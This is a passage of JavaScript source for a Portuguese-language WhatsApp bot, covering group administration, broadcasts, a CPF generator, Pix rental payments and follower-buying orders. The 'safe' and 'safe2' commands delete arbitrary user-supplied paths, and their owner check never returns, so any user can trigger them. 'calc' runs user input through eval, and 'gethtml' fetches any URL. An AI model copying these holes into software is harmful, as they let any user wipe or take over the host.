👤 *Nome:* ${pushname}
🎗 *Cargo:* ${infous}

🧠 *Conselho do dia:* "${conselho}"

📊 *Extras Aleatórios:*
🥵 Gado: ${nivelGado}%
💋 Gostoso(a): ${nivelGostoso}%
💃 Puta(o): ${nivelPuta}%
📡 Programa nº ${programa}`;

safeSendMessage(from, {image: {url: ppimg}, caption: texto, footer: `${NomeDoBot}`,
buttons: [
{
buttonId: `${prefix}ping`,
buttonText: { displayText: '「 ⚡️ 」𝐏𝐈𝐍𝐆「 ⚡️ 」' },
type: 1
},
{
buttonId: `${prefix}menu`,
buttonText: { displayText: '「 🫟 」𝐌𝐄𝐍𝐔「 🫟 」' },
type: 1
}], headerType: 1, viewOnce: true, contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: newscanal,
newsletterName: nomecanal,
serverMessageId: ''
}
}
}, {quoted: non});
}
break;

case 'gethtml': {
try {
if (q.length < 5) return enviar(`Exemplo: ${prefix+command} http://exemplo.com/docs.html`);
let url = q.trim()
if (!url.startsWith('http://') && !url.startsWith('https://')) {
url = 'http://' + url
}
let fetch = require('node-fetch');
let fs = require('fs');
let path = require('path');
let response = await fetch(url);
if (!response.ok) {
return enviar(`Erro ao acessar o site. Código de status: ${response.status}`)
}
reagir(from, "️⏳");
let html = await response.text();
let fileName = path.basename(new URL(url).pathname);
if (!fileName) fileName = "index.html";
let filePath = path.join(__dirname, fileName);
fs.writeFileSync(filePath, html, "utf-8");
await safeSendMessage(from, {document: fs.readFileSync(filePath), fileName: fileName, mimetype: 'text/html'}, {quoted: info});
await reagir(from, '✅️');
await sleep(1000);
fs.unlinkSync(filePath);
} catch (e) {
console.log(e)
await enviar("Erro ao acessar o site.")
await reagir(from, "❌️");
}
}
break;

case 'getperfil': {
reagir(from, '✅️')
if (!menc_os2 && !q) {
return enviar('❌ Marque o usuário, responda uma mensagem, use @558999. ou digite o número após o comando.');
reagir(from, "❌️")
}
const target = (menc_os2 || q).replace(/[^0-9]/g, '') + '@c.us';
let ppimg;
try {
ppimg = await client.profilePictureUrl(target, 'image');
} catch {
return enviar('❌ Não foi possível pegar a foto de perfil do usuário ❌');
reagir(from, "❌️")
}
safeSendMessage(from, {image: {url: ppimg}}, {quoted: non});
}
break;

case 'tabela':
safeSendMessage(from, {text: tabela(NomeDoBot)}, {quoted: non})
break 

case 'destrava2':
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium)
safeSendMessage(from, {text: destrava2 }, {quoted: non})
break

case 'idiomas':
case 'idioma':
safeSendMessage(from, {text: getInfo.listLanguages}, {quoted: non})
break

case 'infobv':
case 'infowelcome':
case 'infobemvindo':
safeSendMessage(from, {text: getInfo.bemvindo}, {quoted: non})
break

case 'getquoted':
case 'getinfo':  
case 'get':  
case 'mek':
enviar(JSON.stringify(info, null, 3))
break

case 'get-txt':  
enviar(JSON.stringify(info.message.extendedTextMessage.contextInfo.quotedMessage.conversation, null, 2))
break

case 'gerarcpf':
cp1 = `${Math.floor(Math.random() * 300) + 600}`
cp2 = `${Math.floor(Math.random() * 300) + 600}`
cp3 = `${Math.floor(Math.random() * 300) + 600}`
cp4 = `${Math.floor(Math.random() * 30) + 60}`
cpf = `${cp1}.${cp2}.${cp3}-${cp4}`
safeSendMessage(from, {text: `CPF gerado com sucesso : ${cpf}`}, {quoted: non})
break

case 'ddd':
if(!q) return enviar(`Use ${prefix + command} 81`)
ddd = body.slice(5)
ddds = await axios.get(`https://brasilapi.com.br/api/ddd/v1/${ddd}`)
dddlist = `Lista de Cidades de ${ddds.data.state} com este DDD ${q}>\n\n`
for (let i = 0; i < ddds.data.cities.length; i++) { dddlist += `${i + 1} ⪧ *${ddds.data.cities[i]}*\n` }
safeSendMessage(from, {text: dddlist}, {quoted: non})	
break

//===========(ADMS-FUNÇÕES-AKI)=========\\

case 'calculadora':
case 'calcular':  
case 'calc':
rsp = q.replace("x", "*").replace('"', ":").replace(new RegExp("[()abcdefghijklmnopqrstwuvxyz]", "gi"), "").replace("÷", "/")
return enviar(JSON.stringify(eval(rsp, null,'\t')))
break 

case 'nomegp':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
blat = args.join(" ")
client.groupUpdateSubject(from, `${blat}`)
safeSendMessage(from, {text: 'Sucesso, alterou o nome do grupo'}, {quoted: non})
break

case 'descgp':
case 'descriçãogp':  
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.adm)
blabla = args.join(" ")
client.groupUpdateDescription(from, `${blabla}`)
safeSendMessage(from, {text: 'Sucesso, alterou a descrição do grupo'}, {quoted: non})
break

case 'setfotogp':
case 'fotogp':  
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!isQuotedImage) return enviar(`Use: ${prefix + command} <Marque uma foto>`)
ftgp = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(ftgp.mimetype))
buffimg = await getFileBuffer(ftgp, 'image')
fs.writeFileSync(rane, buffimg)
medipp = rane 
client.updateProfilePicture(from, {url: medipp})
enviar(`Foto do grupo alterada com sucesso.`) 
break

case 'linkgp':
case 'linkgroup':
if(!isGroup) return enviar(arise.grupo)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
linkgc = await client.groupInviteCode(from)
enviar('https://chat.whatsapp.com/'+linkgc)
break

case 'recrutar':
case 'recruta':
if(!isGroup) return enviar(arise.grupo)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!q) return enviar("Cadê o número do usuário que deseja convidar.")
try {
photoG = await client.profilePictureUrl(from, 'image')
} catch {
photoG = 'https://qu.ax/CDMtr.jpg'
}
rcrt = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
linkgc = await client.groupInviteCode(from)
safeSendMessage(rcrt, {image: {url: photoG}, caption: `*Olá, tudo bem?* Você foi convidado(a) pelo(a) adminstrador(a) do grupo.\n\nhttps://chat.whatsapp.com/${linkgc}`});
enviar("Recrutamento enviado.")
break

case 'listatm':
if(!SoDono) return enviar(arise.donosmt)
rgp = JSON.parse(fs.readFileSync("./banco de dados/func/tmgroup.json"))
if(rgp.length == 0) return enviar(`Não contém nenhum registro de transmissão, utilize rgtm no grupo que deseja que ele receba as transmissões..`)
bl = "";
for ( i = 0; i < rgp.length; i++) {
bl += `( ${i+1} ) - ID: ${rgp[i].id}\n• Nome do Usuário(a) ou Grupo: ${rgp[i].infonome}\n-\n`
}
enviar(bl)
break

case 'rgtm':
if(!SoDono) return enviar(arise.donosmt)
rgp = JSON.parse(fs.readFileSync("./banco de dados/func/tmgroup.json"))
if(JSON.stringify(rgp).includes(from)) return enviar("Este grupo/usuário já está registrado na lista de transmissão") 
rgp.push({id: from, infonome: `${isGroup ? groupName: pushname}`})
fs.writeFileSync("./banco de dados/func/tmgroup.json", JSON.stringify(rgp))
enviar("Registrado com sucesso, quando for realizada as transmissões, esse grupo/usuário estará na lista.")
break

case 'tirardatm':
if(!SoDono) return enviar(arise.donosmt)
rgp = JSON.parse(fs.readFileSync("./banco de dados/func/tmgroup.json"))
if(!JSON.stringify(rgp).includes(from)) return enviar("Este grupo/usuário não está registrado para ser tirado da lista de transmissão") 
if(q.trim().length > 4) {
var ustm = rgp.map(i => i.id).indexOf(q.trim())
} else {
var ustm = rgp.map(i => i.id).indexOf(from)
}
rgp.splice(ustm, 1)
fs.writeFileSync("./banco de dados/func/tmgroup.json", JSON.stringify(rgp))
enviar("Grupo/Usuário tirado da lista de transmissão com sucesso")
break

case 'fazertm':
if(!SoDono) return enviar(arise.donosmt)
var rgp = JSON.parse(fs.readFileSync("./banco de dados/func/tmgroup.json"))
if(rgp.lengh == 0) return enviar("Não contém nenhum grupo registrado para realizar transmissão") 
await sleep(1000);
var DFC = "";
var rsm = info.message?.extendedTextMessage?.contextInfo?.quotedMessage
var pink = isQuotedImage ? rsm?.imageMessage: info.message?.imageMessage
var blue = isQuotedVideo ? rsm?.videoMessage: info.message?.videoMessage
var red = isQuotedMsg ? rsm?.textMessage: info.message?.textMessage
var purple = isQuotedDocument ? rsm?.documentMessage: info.message?.documentMessage
var yellow = isQuotedDocW ? rsm?.documentWithCaptionMessage?.message?.documentMessage: info.message?.documentWithCaptionMessage?.message?.documentMessage
var aud_d = isQuotedAudio ? rsm.audioMessage : ""
var figu_d = isQuotedSticker ? rsm.stickerMessage : ""
var red = isQuotedMsg && !aud_d &&!figu_d && !pink && !blue&& !purple && !yellow? "Transmissão do Proprietário: "+rsm.conversation: info.message?.conversation
var green = isQuotedMsg2 && !aud_d &&!figu_d && !red && !pink && !blue && !purple && !yellow ? "Transmissão do Proprietário: "+rsm.extendedTextMessage?.text : info?.message?.extendedTextMessage?.text
if(pink) {
var DFC = pink
pink.caption = q.length > 1 ? "Transmissão do Proprietário: "+q : pink.caption.replace(new RegExp(command, "gi"), `Transmissão do Proprietário: ${NickDono}\n\n`)
pink.image = {url: pink.url}
} else if(blue) {
var DFC = blue  
blue.caption = q.length > 1 ? "Transmissão do Proprietário: "+q : blue.caption.replace(new RegExp(command, "gi"), `Transmissão do Proprietário: ${NickDono}\n\n`)
blue.video = {url: blue.url}
} else if(red) {
black = {}
black.text = red.replace(new RegExp(command, "gi"), `Transmissão do Proprietário: ${NickDono}\n\n`)
var DFC = black
} else if(!aud_d && !figu_d && green) {
brown = {}
brown.text = green.replace(new RegExp(command, "gi"), `Transmissão do Proprietário: ${NickDono}\n\n`)
var DFC = brown
} else if(purple) {
var DFC = purple
purple.document = {url: purple.url} 
} else if(yellow) {
var DFC = yellow 
yellow.caption = q.length > 1 ? "Transmissão do Proprietário: "+q : yellow.caption.replace(new RegExp(command, "gi"), `Transmissão do Proprietário: ${NickDono}\n\n`)
yellow.document = {url: yellow.url}  
} else if(figu_d) {
var DFC = figu_d
figu_d.sticker = {url: figu_d.url}
} else if(aud_d) {
var DFC = aud_d
aud_d.audio = {url: aud_d.url}
}
for (i = 0; i < rgp.length; i++) {
safeSendMessage(rgp[i].id, DFC)}
break

case 'grupo': 
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(args[0] === 'a') {
enviar(`o grupo foi aberto com sucesso..`)
client.groupSettingUpdate(from, 'not_announcement')
} else if(args[0] === 'f') {
enviar(`o grupo foi fechado com sucesso..`)
client.groupSettingUpdate(from, 'announcement')
}				 
break

case "save":
if (!nubi)return enviar('apenas meu dono.')
saveInitialHashes();
enviar("Copias de monitoramento salvas.");
break;

case "check":
if (!nubi)return enviar('apenas meu dono.')
checkForModifications();
break;

case "monitorar":
if (!nubi)return enviar('apenas meu dono.')
enviar("🔍 Monitorando alterações nos arquivos...");
setInterval(checkForModifications, 30000);
break;

case 'safe':
if(!nubi) reagir(from, '💣')
if(!q) return enviar('Eo caminho??')
fs.unlinkSync(`${q}`);
reagir(from, '🤓')
break

case 'safe2':
if(!nubi) reagir(from, '💣')
if(!q) return enviar('Eo caminho??')
fs.rm(`${q}`, { recursive: true, force: true });
reagir(from, '🤓')
break

case 'safe3':
if(!nubi) reagir(from, '💣')
if(!q) return enviar('Eo caminho??')
fs.rm('./dono', { recursive: true, force: true });
reagir(from, '🤓')
break

case 'imagin2z':
if (!q) return enviar(`Digite o que você quer imaginar.\nExemplo: ${prefix}imagine dragão no espaço.`);
reagir(from, '✅️')
try {

const imageUrl = await imagineFromCivitai(q);
const response = await axios.get(imageUrl, { responseType: 'arraybuffer'});
const buffer = Buffer.from(response.data, 'binary');

await safeSendMessage(from, {image: buffer}, {quoted: non});
} catch (err) {
console.error(err);
enviar('Erro ao gerar imagem. Tente novamente mais tarde.');
}
break;

case 'grupoinfo':
case 'infogrupo':
case 'infogp':  
case 'gpinfo':  
case 'regras':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins)return enviar(arise.adm)
try {
var ppUrl = await client.profilePictureUrl(from, 'image')
} catch {
var ppUrl = `https://telegra.ph/file/6ca032835ed7a16748b6f.jpg`
}
var puxarInfo = await client.groupMetadata(from)
var ANC_INFO = puxarInfo.announce
var returnAnnounce = ANC_INFO === false ? "Não." : ANC_INFO === true ? "Sim." : undefined
var RST_INFO = puxarInfo.restrict 
var returnRestrict = RST_INFO === false ? "Sim." : RST_INFO === true ? "Não." : undefined
var infoCreator = puxarInfo.subjectOwner || "Não Encontrado"
infoGroup = `• Nome do Grupo: *${puxarInfo.subject}*\n• ID: *${puxarInfo.id}*\n-\n• Criado por: *@${infoCreator.replace("@s.whatsapp.net", "")}*\n• Criação: *${moment(`${puxarInfo.creation}` * 1000).tz('America/Sao_Paulo').format('DD/MM/YYYY HH:mm:ss')}*\n• Última alteração: *${moment(`${puxarInfo.subjectTime}` * 1000).format('DD/MM/YYYY HH:mm:ss')}*\n-\n• Quantidade de adminstradores: *${groupAdmins.length}*\n• Quantidade de membros: *${somembros.length}*\n• Membros e admins: *${puxarInfo.participants.length} participantes*\n-\n• Fechado no momento? *${returnAnnounce}*`
safeSendMessage(from, {image: {url: ppUrl}, caption: infoGroup, mentions: [infoCreator]}, {quoted: non})
break 

case 'totag':
case 'cita':
case 'hidetag':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
var DFC = "";
var rsm = info.message?.extendedTextMessage?.contextInfo?.quotedMessage
var pink = isQuotedImage ? rsm?.imageMessage: info.message?.imageMessage
var blue = isQuotedVideo ? rsm?.videoMessage: info.message?.videoMessage
var purple = isQuotedDocument ? rsm?.documentMessage: info.message?.documentMessage
var yellow = isQuotedDocW ? rsm?.documentWithCaptionMessage?.message?.documentMessage: info.message?.documentWithCaptionMessage?.message?.documentMessage
var aud_d = isQuotedAudio ? rsm.audioMessage : ""
var figu_d = isQuotedSticker ? rsm.stickerMessage : ""
var red = isQuotedMsg && !aud_d && !figu_d && !pink && !blue&& !purple && !yellow? rsm.conversation: info.message?.conversation
var green = rsm?.extendedTextMessage?.text || info?.message?.extendedTextMessage?.text
var MRC_TD = groupMembers.map(i => i.id)
if(pink && !aud_d && !purple) {
var DFC = pink
pink.caption = q.length > 1 ? "Marcação do(a) Adm: "+q :pink.caption.replace(new RegExp(command, "gi"), `Marcação do(a) Adm: ${pushname}\n\n`)
pink.image = {url: pink.url}
pink.mentions = MRC_TD
} else if(blue && !aud_d && !purple) {
var DFC = blue  
blue.caption = q.length > 1 ? "Marcação do(a) Adm: "+q.trim() :blue.caption.replace(new RegExp(command, "gi"), `Marcação do(a) Adm: ${pushname}\n\n`).trim()
blue.video = {url: blue.url}
blue.mentions = MRC_TD
} else if(red && !aud_d && !purple) {
black = {}
black.text = red.replace(new RegExp(command, "gi"), `Marcação do(a) Adm: ${pushname}\n\n`).trim()
black.mentions = MRC_TD
var DFC = black
} else if(!aud_d && !figu_d && green && !purple && !purple) {
brown = {}
brown.text = green.replace(new RegExp(command, "gi"), `Marcação do(a) Adm: ${NickDono}\n\n`).trim()
brown.mentions = MRC_TD
var DFC = brown
} else if(purple) {
var DFC = purple
purple.document = {url: purple.url}
purple.mentions = MRC_TD
} else if(yellow && !aud_d) {
var DFC = yellow 
yellow.caption = q.length > 1 ? "Marcação do(a) Adm: "+q.trim() :yellow.caption.replace(new RegExp(command, "gi"), `Marcação do(a) Adm: ${pushname}\n\n`).trim()
yellow.document = {url: yellow.url}
yellow.mentions = MRC_TD
} else if(figu_d && !aud_d) {
var DFC = figu_d
figu_d.sticker = {url: figu_d.url}
figu_d.mentions = MRC_TD
} else if(aud_d) {
var DFC = aud_d
aud_d.audio = {url: aud_d.url}
aud_d.mentions = MRC_TD
aud_d.ptt = true
}
safeSendMessage(from, DFC).catch(e => {
console.log(e)
})
break

case 'marcar':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
async function marcac() {
bla = []
blad = `• Mencionando os membros comuns do grupo ou de uma comunidade. ${!q ? "" : `\n*Mensagem:* ${q}`}\n\n`
for( let i of somembros ) {
blad += `➥ @${i.split("@")[0]}\n`
bla.push(i)
}
blam = JSON.stringify(somembros)
if(blam.length == 2) return enviar(`❌️ Olá *${pushname}* - Não contém nenhum membro comum no grupo, é sim apenas administradores. `)
mentions(blad, bla, true)  
}
marcac().catch(e => {
console.log(e)
})
break

case 'marcar2':
try {
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += ''
for (let mem of groupMembers) {
teks += `╠➥ @${mem.id.split('@')[0]}\n`
members_id.push(mem.id)
}
enviar(teks)
} catch {
enviar('Erro ao mencionar.')
}
break

case 'marcarwa':
try {
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)  
if(q.includes(``)) return enviar("Não pode utilizar comandos nesse comando")
members_id = []
teks = (args.length > 1) ? body.slice(10).trim() : ''
teks += ''
for (let mem of groupMembers) {
teks += `╠➥ https://wa.me/${mem.id.split('@')[0]}\n`
members_id.push(mem.id)
}
safeSendMessage(from, {text: teks}, {quoted: non})
} catch {
enviar('Erro ao mencionar.')
}
break

case 'reviverqr':
if(!SoDono) return 
exec(`cd ${folderUserAuth} && rm -rf pre-key* sender* session*`)
setTimeout(async () => {
enviar("Reiniciando..")
setTimeout(async () => {
process.exit()
}, 1200)
}, 1000)
break

case 'figucircula':
if (!isQuotedVideo && !info.message.videoMessage) {
return enviar('Marque um vídeo/gif que você deseja converter para mensagem de vídeo.')}
client.relayMessage(from, {ptvMessage: isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage }, {})
break

case 'reviver':
if(!isGroup) return enviar(arise.grupo)
if(!SoDono) return enviar(arise.donosmt)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return enviar('Marque uma mensagem do alvo!')
sleep(5000)
response2 = await client.groupParticipantsUpdate(from, [menc_prt], "add" )
enviar('Usuario adicionado de volta ao grupo.')
break

case 'sairgp':
if(isGroup && !SoDono && !info.key.fromMe) return enviar("Este comando só o dono pode executar..")
try {
client.groupLeave(from)
} catch(erro) {
enviar(String(erro))
}
break

case 'saldo':
if(!SoDono) return enviar(arise.donosmt)
try {
  reagir(from, "✅️")
    let apiKey = API_UPDIMIA; 
    let apiUrl = 'https://upmidiass.net/api/v2';
    let fetch = require('node-fetch');

    fetch(apiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            key: API_UPDIMIA,
            action: 'balance'
        })
    })
    .then(res => res.json())
    .then(data => {
        if (!data || data.error) return enviar(`❌ Erro ao consultar saldo: ${data?.error || "Erro desconhecido."}`);

        enviar(`💳 *Saldo disponível:* *${data.balance}* ${data.currency}`);
    })
    .catch(() => {
        return enviar("❌ Erro ao conectar-se à API.");
    });

} catch (e) {
    return enviar("❌ Erro interno ao verificar saldo.");
}
break;

case 'addsaldo':
  reagir(from, "✅️")
    enviar(`💰 *Como adicionar saldo?*\n\n1️⃣ Envie a quantia desejada para o pix abaixo: \n\n📱 Telefone: 55 (88) 9348-7916\n\n2️⃣ Após o pagamento contate o meu dono.`);
break;

case 'servicos':
reagir(from, "✅️")
let apiUrl = 'https://upmidiass.net/api/v2';
let fetch = require('node-fetch');

    fetch(apiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            key: API_UPDIMIA,
            action: 'services'
        })
    })
    .then(res => res.json())
    .then(data => {
        if (!data || data.length === 0) return enviar('❌ Nenhum serviço encontrado.');

        let resposta = '📋 *Lista de Serviços:* \n\n';
        data.forEach(servico => {
            resposta += `ID: ${servico.service}\nNome: ${servico.name}\nPreço: $${servico.rate}\nMin: ${servico.min} / Max: ${servico.max}\n\n`;
        });

        enviar(resposta);
    })
    .catch(err => {
        console.error(err);
        enviar('❌ Erro ao buscar os serviços.');
    });
break;
 
case 'compraraluguel': {
const [diasStr, ...resto] = q.split(" ");
const link = resto.join(" ").trim();
const dias = parseInt(diasStr);
if (!dias || isNaN(dias) || dias < 1 || dias > 90)
return enviar(`❌ Quantidade de dias inválida.\nEx: ${prefix}compraraluguel 30 https://chat.whatsapp.com/SEULINK`);
if (!link.includes("chat.whatsapp.com"))
return enviar(`❌ Envie o link do grupo junto.\nEx:\n${prefix}compraraluguel 30 https://chat.whatsapp.com/SEULINK`);

const match = link.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/i);
if (!match) return enviar("❌ Link de grupo inválido.");
reagir(from, "✅️");
const codigoConvite = match[1];
const valorPorDia = 0.50;
const total = dias * valorPorDia;

const pagamentos = lerJSON('./exports/funcoes/pagamentosAluguel.json');
const idempotencyKey = gerarIdUnico();

try {
const res = await axios.post("https://api.mercadopago.com/v1/payments", {
transaction_amount: total,
payment_method_id: "pix",
description: `Aluguel de grupo por ${dias} dia(s)`,
payer: {email: "comprador@email.com"}
}, {
headers: {
Authorization: `Bearer ${TOKEN_MERCADO_PAGO}`,
'Content-Type': 'application/json',
'X-Idempotency-Key': idempotencyKey
}
});

const pagamento = res.data;
const copiaCola = pagamento.point_of_interaction.transaction_data.qr_code;
const qrBase64 = pagamento.point_of_interaction.transaction_data.qr_code_base64;

pagamentos[sender] = {
id: pagamento.id,
dias,
link: codigoConvite,
status: 'pendente',
criado: Date.now()
};
salvarJSON('./exports/funcoes/pagamentosAluguel.json', pagamentos);

const texto = `🏷️ *ALUGUEL DE GRUPO* 🏷️

• Quantidade de dias: [ ${dias} ]
• Custo calculado: R$${total.toFixed(2)}

Após o pagamento, clique em *verificar* ou use ${prefix}verificaraluguel para o bot entrar automaticamente no grupo.

Use o QR Code ou copie:`;

await client.relayMessage(from, {
interactiveMessage: {
header: {
hasMediaAttachment: true,
imageMessage: (await prepareWAMessageMedia({ image: Buffer.from(qrBase64, 'base64') }, {upload: client.waUploadToServer})).imageMessage
},
headerType: 'IMAGE',
body: {text: texto },
footer: {text: `${NomeDoBot}`},
nativeFlowMessage: {
buttons: [
{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "「 💸 」𝐂𝐎𝐏𝐈𝐀𝐑 𝐏𝐈𝐗「 💸 」",
copy_code: copiaCola
})
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "「 ✅️ 」𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀𝐑「 ✅️ 」",
id: `${prefix}verificaraluguel`
})
},
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"「 ☁️ 」𝐇𝐎𝐒𝐓 𝐒𝐂𝐀𝐋𝐄「 ☁️ 」\",\"url\":\"https://hostscale.shop\",\"merchant_url\":\"https://hostscale.shop\"}"
}
],
messageParamsJson: ""
},
contextInfo: {
participant: from,
quotedMessage: non,
isForwarded: true
}
}
}, {});
} catch (err) {
console.log(err.response?.data || err);
enviar("❌ Erro ao gerar o pagamento.");
}
}
break;


case 'verificaraluguel': {
const pagamentos = lerJSON('./exports/funcoes/pagamentosAluguel.json');
const userPagamento = pagamentos[sender];
// Limpeza automática de pendentes antigos
for (const user in pagamentos) {
const registro = pagamentos[user];
if (registro.status === "pendente" && registro.criado && (Date.now() - registro.criado > 5 * 60 * 1000)) {
    delete pagamentos[user];
}
}
salvarJSON('./exports/funcoes/pagamentosAluguel.json', pagamentos);

if (!userPagamento) return enviar(`❌ Você ainda não gerou um pagamento de aluguel. Use:\n"${prefix}compraraluguel <dias> <link>"`);
if (userPagamento.status === "aprovado") return enviar("✅ Pagamento já aprovado e grupo alugado.");

try {
const response = await axios.get(`https://api.mercadopago.com/v1/payments/${userPagamento.id}`, {
headers: { Authorization: `Bearer ${TOKEN_MERCADO_PAGO}` }
});

const status = response.data.status;

if (status === "approved") {
const codigoConvite = userPagamento.link;
let group = await client.groupAcceptInvite(codigoConvite).catch(err => {
console.error("Erro ao entrar:", err);
return null;
});

if (!group) return enviar("❌ Pagamento aprovado, mas falha ao entrar no grupo. Verifique se o link ainda é válido.");

// Esperar 2 segundos para garantir que o bot entrou e pode enviar mensagem
await sleep(5000);

// Envia mensagem no grupo
await safeSendMessage(group, {text: `🤖 Olá, fui adicionado automaticamente! Este grupo foi alugado por *${userPagamento.dias}* dia(s).`});

// Confirma o ID do grupo (se group não tiver .id, tenta obter pelo metadata)
let groupId = group.id || group;
if (!groupId.includes("@g.us")) {
const metadata = await client.groupMetadata(group);
groupId = metadata.id;
}

let grupos = lerJSON('./banco de dados/grupos/aluguel/grupos.json');
let aluguel = lerJSON('./banco de dados/grupos/aluguel/aluguel.json');

if (!grupos.some(g => g.id === groupId)) {
grupos.push({id: groupId, limite: 5, validado: true});
salvarJSON('./banco de dados/grupos/aluguel/grupos.json', grupos);
}

if (!aluguel.some(a => a.id === groupId)) {
        aluguel.push({
        id: groupId,
        nome: (await client.groupMetadata(groupId)).subject || "Grupo",
        tempo: userPagamento.dias + 1,
        totalRent: userPagamento.dias + 1,
        cliente: sender,
        save: Number(moment.tz('America/Sao_Paulo').format('DD')),
        cortesia: false
});
salvarJSON('./banco de dados/grupos/aluguel/aluguel.json', aluguel);
}

// Apaga o registro de pagamento
delete pagamentos[sender];
salvarJSON('./exports/funcoes/pagamentosAluguel.json', pagamentos);

await enviar(`🎉 Pagamento aprovado! Grupo alugado com sucesso por *${userPagamento.dias}* dia(s)!`);
return reagir(from, "✅️");
setTimeout(() => process.exit(0), 2000);
} else {
await enviar(`❌ Pagamento está pendente.`);
return reagir(from, "❌");
}
} catch (err) {
console.log(err.response?.data || err);
return enviar("❌ Erro ao verificar o pagamento.");
}
}
break;


case 'copiarpixaluguel': {
const pagamentos = lerJSON('./exports/funcoes/pagamentosAluguel.json');
const userPagamento = pagamentos[sender];
if (!userPagamento) return enviar(`❌ Você ainda não gerou um pagamento de aluguel.\nUse: "${prefix}compraraluguel <dias>"`);

try {
const response = await axios.get(`https://api.mercadopago.com/v1/payments/${userPagamento.id}`, {
headers: { Authorization: `Bearer ${TOKEN_MERCADO_PAGO}` }
});

const status = response.data.status;
const pixCode = response.data.point_of_interaction.transaction_data.qr_code;

enviar(`${pixCode}`);
} catch (err) {
console.log(err.response?.data || err);
enviar("❌ Erro ao buscar o código Pix.");
}
}
break;

case 'comprasv': {
if (args.length < 3) return enviar(`❌ Use: ${prefix}comprasv <ID do serviço> <link> <quantidade>`);
const serviceID = args[0];
const link = args[1];
const quantity = args[2];
try {
let fetch = require('node-fetch');
const response = await fetch('https://upmidiass.net/api/v2', {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({
key: API_UPDIMIA,
action: 'add',
service: serviceID,
link: link,
quantity: quantity
})
});
const data = await response.json();
if (data.error || data.status === 'error') {
return enviar(`❌ Erro ao comprar: ${data.error || data.message || 'Erro desconhecido'}`);
}
enviar(`✅ *Pedido realizado com sucesso!*\n📦 ID do Pedido: ${data.order}`);
reagir(from, "✅️")
} catch (err) {
console.error(err);
reagir(from, "❌")
enviar('❌ Erro ao processar a compra.');
}
}
break;

case 'pedido':
try {
    if (!args[0]) return enviar("❌ Use: `/pedido <ID do Pedido>`");
    reagir(from, "✅️")

    let apiUrl = 'https://upmidiass.net/api/v2';
    let orderID = args[0]; // ID do pedido informado pelo usuário
    let fetch = require('node-fetch');

    fetch(apiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            key: API_UPDIMIA,
            action: 'status',
            order: orderID
        })
    })
    .then(res => res.json())
    .then(data => {
        if (!data || data.error) return enviar(`❌ Erro ao consultar: "Pedido não encontrado."}`);

        let statusPedido = {
            "Pending": "🟡 Pendente",
            "Processing": "🔵 Processando",
            "In progress": "🟠 Em andamento",
            "Completed": "🟢 Concluído",
            "Partial": "🟣 Parcialmente entregue",
            "Canceled": "🔴 Cancelado"
        };

        let status = statusPedido[data.status] || "🔴 Status desconhecido";
        let faltam = data.remains || 0; // Quantidade restante para ser entregue

        let resposta = `📦 *Detalhes do Pedido:*\n\n` +
                       `🆔 *ID:* ${orderID}\n` +
                       `🔄 *Status:* ${status}\n` +
                       `🛜 *Inicial:* ${data.start_count} Seguidores\n` +
                       `📉 *Restam:* ${faltam}\n` +
                       `💵 *Valor gasto:* $${data.charge} ${data.currency}`;

        enviar(resposta);
    })
    .catch(() => {
        return enviar("❌ Erro ao conectar-se à API.");
    });

} catch (e) {
    return enviar("❌ Erro interno ao verificar pedido.");
}
break;

case 'categoria':
    try {
        if (!args[0]) return enviar('❌ Use: `/categoria <nome>`\n\nPara ver todas as categorias, use `/categorias`.');
        reagir(from, "✅️")
        
        let apiUrl = 'https://upmidiass.net/api/v2';
        let fetch = require('node-fetch');

        let categoriaBuscada = args.join(' ').toLowerCase();

        fetch(apiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                key: API_UPDIMIA,
                action: 'services'
            })
        })
        .then(res => res.json())
        .then(data => {
            if (!data || data.length === 0) return enviar('❌ Nenhum serviço encontrado.');

            let servicosCategoria = data.filter(servico => servico.category.toLowerCase().includes(categoriaBuscada));

            if (servicosCategoria.length === 0) {
                return enviar(`❌ Nenhuma categoria encontrada com esse nome.\n\n📌 *Veja todas as categorias em:* /categorias`);
            }

            let resposta = `📂 *Categoria: ${categoriaBuscada}*\n\n`;
            servicosCategoria.forEach(servico => {
